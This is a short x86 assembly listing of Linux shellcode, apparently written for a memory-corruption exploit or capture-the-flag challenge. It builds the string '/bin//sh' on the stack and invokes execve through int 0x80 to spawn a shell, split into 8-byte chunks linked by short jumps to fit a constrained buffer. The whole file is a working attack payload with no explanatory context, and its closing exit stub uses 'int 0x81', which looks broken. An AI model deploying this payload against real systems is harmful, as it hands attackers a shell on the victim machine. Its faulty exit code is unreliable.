BITS 32;

_start:
    xor eax, eax    ; first 8 bytes
    xor edx, edx
    xor ecx, ecx
    jmp short $+0x06
    
    push eax        ; second
    push 0x68732f2f
    jmp short $+0x06

    push 0x6e69622f ; third
    nop
    jmp short $+0x06

    mov ebx, esp
    mov al, 0xb     ; last
    int 0x80
    jmp short $+0x06

    mov al, 0x1
    int 0x81
